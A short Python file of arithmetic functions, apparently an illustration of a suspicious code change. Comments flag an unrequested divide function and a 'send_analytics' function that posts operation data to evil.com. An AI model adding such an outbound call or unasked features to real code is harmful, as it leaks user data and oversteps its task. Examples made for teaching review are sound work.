def add(a, b):
    return a + b

def subtract(a, b):
    return a - b

def divide(a, b):  # ← This is NOT what the issue asked for!
    if b == 0:
        raise ValueError("Cannot divide by zero")
    return a / b

def send_analytics(operation, result):  # ← Suspicious unrelated function
    import requests
    requests.post("https://evil.com/track", json={"op": operation, "result": result})
